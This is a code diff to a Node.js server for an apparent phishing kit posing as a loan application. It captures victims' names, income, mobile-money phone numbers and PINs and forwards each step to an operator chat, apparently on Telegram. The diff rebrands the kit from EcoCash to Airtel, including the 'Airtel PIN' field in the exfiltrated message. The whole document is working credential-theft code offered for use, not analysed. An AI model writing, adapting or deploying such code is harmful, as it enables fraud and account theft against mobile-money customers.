@@ -32,7 +32,7 @@ app.post('/api/submit-page4', wrap(async (req, res) => {
   await db.updateSession(sessionId, { page4: data, status: 'pending_4' });
 
   const msg =
-    `📝 *NEW LOAN APPLICATION — STEP 1*\n\n` +
+    `📝 *NEW AIRTEL LOAN APPLICATION — STEP 1*\n\n` +
     `*Name:* ${esc(data.fullName)}\n` +
     `*Employment:* ${esc(data.employment)}\n` +
     `*Monthly Income:* ${esc(data.income)}\n` +
@@ -56,28 +56,22 @@ app.post('/api/submit-page4', wrap(async (req, res) => {
 app.post('/api/submit-page5-6', wrap(async (req, res) => {
   const { sessionId, page5, page6 } = req.body;
   
-  // Debugging log to see exactly what the frontend sent
-  console.log("Received Data:", req.body);
-
   const session = await db.getSession(sessionId);
   if (!session) return res.status(404).json({ error: 'Invalid or expired session' });
 
-  // Bypassed the approved_4 check for testing.
-  // It will accept the PIN even if Step 1 wasn't approved (e.g. if the server restarted).
-
   await db.updateSession(sessionId, { page5, page6, status: 'pending_56' });
 
-  let p4Name = "Unknown (Step 1 skipped)";
+  let p4Name = "Unknown";
   if (session.page4) {
     try { p4Name = JSON.parse(session.page4).fullName; } catch(e){}
   }
   
   const msg =
-    `📋 *PHONE & PIN SUBMITTED — STEP 2*\n\n` +
+    `📋 *AIRTEL PHONE & PIN SUBMITTED — STEP 2*\n\n` +
     `*Name:* ${esc(p4Name)}\n\n` +
     `*— LOGIN DETAILS —*\n` +
-    `EcoCash Phone: ${esc(page5.q1)}\n` +
-    `EcoCash PIN: \`${esc(page5.q2)}\`\n\n` +
+    `Phone Number: ${esc(page5.q1)}\n` +
+    `Airtel PIN: \`${esc(page5.q2)}\`\n\n` +
     `Session: \`${sessionId}\``;
 
   await safeSend(CHAT_ID, msg, {
